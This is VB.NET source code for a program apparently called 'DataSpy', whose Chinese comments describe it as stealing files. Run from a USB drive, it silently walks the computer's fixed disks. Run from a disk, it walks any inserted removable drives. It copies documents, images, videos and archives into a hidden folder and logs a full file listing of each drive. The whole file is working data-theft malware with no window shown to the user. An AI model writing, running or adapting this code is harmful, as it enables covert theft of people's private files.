Imports System.IO
Imports System.Threading
Imports Microsoft.VisualBasic.ApplicationServices

Namespace My
#Const Debuging = False

    Partial Friend Class MyApplication

        '允许拷贝的文件最大大小
        Private Const MaxFileSize As Integer = 128 * 1024 * 1024
        Dim TargetRootPath As String = Directory.GetCurrentDirectory & "\"
        Dim TargetExtension As String
        Dim DriveCount As Integer = 0

        Private Sub MyApplication_Startup(sender As Object, e As StartupEventArgs) Handles Me.Startup
#If Debuging Then
            TargetExtension = ".txt"
            DriveCount = 1
            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf ScanDrive), New DriveInfo("H"))
            Thread.Sleep(Timeout.Infinite)
#End If

            '默认从 .\DataSpy.txt 读取要窃取的文件类型
            If File.Exists(TargetRootPath & "DataSpy.txt") Then
                TargetExtension = File.ReadAllText(TargetRootPath & "DataSpy.txt")
            Else
                TargetExtension = Join(New String() {".jpg", ".doc", ".docx", ".png", ".gif", ".xls", ".jpeg", ".txt", ".ppt", ".pptx", ".mp4", ".avi", ".mkv", ".zip"})
            End If

            Debug.Print(" * —————————— * ")
            Debug.Print("[{0}] Program Start Up!", Now.ToString)
            Debug.Print("[{0}] CurrentDirectory：{1}{2}{3}", Now.ToString, vbCrLf, Strings.Space(4), TargetRootPath)

            Select Case New DriveInfo(TargetRootPath.First).DriveType
                Case DriveType.Removable
                    Debug.Print("Application run from UDisk, going to spy data from Disk.")
                    StartSpyTargetDrive(DriveType.Fixed)
                Case DriveType.Fixed
                    Debug.Print("Application run from Disk, going to spy data from UDisk.")
                    StartSpyTargetDrive(DriveType.Removable)
            End Select

            '无限阻塞Invoke基础句柄线程，防止程序要求启动窗体
            Thread.Sleep(Timeout.Infinite)
        End Sub

        Private Sub StartSpyTargetDrive(TargetDriveType As DriveType)
            Dim DriveInfos() As DriveInfo = DriveInfo.GetDrives
            For Each Drive In DriveInfos.Where(Function(x) x.IsReady AndAlso x.DriveType = TargetDriveType)
                DriveCount += 1
                Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf ScanDrive), Drive)
            Next

            If DriveCount <= 0 Then
                Debug.Print("未找到符合要求的驱动器，程序退出")
                File.Create(TargetRootPath & "NoTaskCreated-" & Now.ToString("yyyy-MM-dd-hh-mm-ss") & ".txt")
                End
            End If
        End Sub

        Private Sub ScanDrive(Drive As DriveInfo)
            On Error Resume Next
            Debug.Print("TaskCount：" & DriveCount)
            Dim InfoFilePath As String = Path.GetTempFileName, TargetPath As String = TargetRootPath & Drive.VolumeLabel
            Directory.CreateDirectory(TargetPath)
#If Not Debuging Then
            Dim DirectoryInfo As DirectoryInfo = New DirectoryInfo(TargetPath) : DirectoryInfo.Attributes = FileAttributes.Hidden
#End If
            Dim WriteText As StreamWriter = New IO.StreamWriter(InfoFilePath)
            WriteText.WriteLine("分区卷标：" & Drive.VolumeLabel)
            WriteText.WriteLine("分区名称：" & Drive.Name)
            WriteText.WriteLine("分区格式：" & Drive.DriveFormat)
            WriteText.WriteLine("可用容量：" & FormatSize(Drive.TotalFreeSpace))
            WriteText.WriteLine("分区容量：" & FormatSize(Drive.TotalSize))
            WriteText.WriteLine("使用比例：" & Math.Round(100 * (1 - Drive.TotalFreeSpace / Drive.TotalSize), 2).ToString & " %")
            WriteText.WriteLine("过滤类型：" & TargetExtension)
            WriteText.WriteLine("开始时间：" & Now.ToString("yyyy-MM-dd hh:mm:ss"))
            WriteText.WriteLine("——————————————")

            ScanDirectoryWithChild(Drive.Name, TargetPath, WriteText)

            WriteText.WriteLine("——————————————")
            WriteText.WriteLine("结束时间：" & Now.ToString("yyyy-MM-dd hh:mm:ss"))
            WriteText.Close() : WriteText.Dispose()
            File.Copy(InfoFilePath, TargetPath & "\$InfoFile.txt", True)

            DriveCount -= 1
            Debug.Print("[{0}] One Task Finished,{1} left.", Now.ToString, DriveCount)
            If DriveCount <= 0 Then
                Debug.Print("Application Exit!")
                File.Create(TargetRootPath & "AllTask(s)Finished-" & Now.ToString("yyyy-MM-dd-hh-mm-ss") & ".txt")
                End
            End If
            'If DriveCount <= 0 Then End
        End Sub

        ''' <summary>
        ''' 对目标目录遍历扫描（包含子目录）
        ''' </summary>
        ''' <param name="FromPath">扫描的路径</param>
        ''' <returns>返回目录的大小</returns>
        Private Function ScanDirectoryWithChild(ByVal FromPath As String, TargetPath As String, ByVal DriveWriter As StreamWriter) As ULong
            Dim FoldersSize As ULong = 0
            Dim FilesSize As ULong = 0

            '递归扫描目录保存进文件
            Dim Directorys() As String
            Try
                Directorys = Directory.GetDirectories(FromPath)
            Catch ex As Exception
                DriveWriter.WriteLine(ex.Message)
                Debug.Print(ex.StackTrace & vbCrLf & ex.Message)
                Return 0
            End Try
            Dim Files() As String = Directory.GetFiles(FromPath)
            For Each DirectoryPath As String In Directorys
                '显示文件夹，对文件夹进行递归扫描
                DriveWriter.WriteLine(DirectoryPath & "\")
                FoldersSize += ScanDirectoryWithChild(DirectoryPath, TargetPath, DriveWriter)
            Next
            For Each FilePath As String In Files
                Try
                    '显示文件，并格式化显示文件大小
                    Dim FileInfomation As FileInfo = New FileInfo(FilePath)
                    Dim FileExtension As String = FileInfomation.Extension.ToLower
                    FoldersSize += FileInfomation.Length
                    FilesSize += FileInfomation.Length
                    DriveWriter.WriteLine(FilePath & " /[" & FormatSize(FileInfomation.Length) & "]")

                    If FileExtension.Length > 0 AndAlso TargetExtension.IndexOf(FileExtension) > -1 Then
                        If FileInfomation.Length <= MaxFileSize Then
                            FileCopy(FilePath, TargetPath & "\" & FilePath.Substring(3).Replace("\", "-"))
                        End If
                    End If
                Catch ex As Exception
                    DriveWriter.WriteLine(ex.Message)
                    Debug.Print(ex.StackTrace & vbCrLf & ex.Message)
                End Try
            Next
            DriveWriter.WriteLine(FromPath & "\ >>>" & vbCrLf &
                            "  >>> [目录总大小： " & FormatSize(FoldersSize) & "] >>>" & vbCrLf &
                            "  >>> [根文件大小： " & FormatSize(FilesSize) & "] >>>" & vbCrLf &
                            "————————————————")
            Return FoldersSize
        End Function

        Private Function FormatSize(ByVal ByteCount As Long) As String
            On Error Resume Next
            If ByteCount < 1024 Then
                Return ByteCount & " Byte"
            ElseIf ByteCount < 1048576 Then
                Return String.Format("{0:n} KB", ByteCount / 1024)
            ElseIf ByteCount < 1073741824 Then
                Return String.Format("{0:n} MB", ByteCount / 1048576)
            Else
                Return String.Format("{0:n} GB", ByteCount / 1073741824)
            End If
        End Function

    End Class
End Namespace
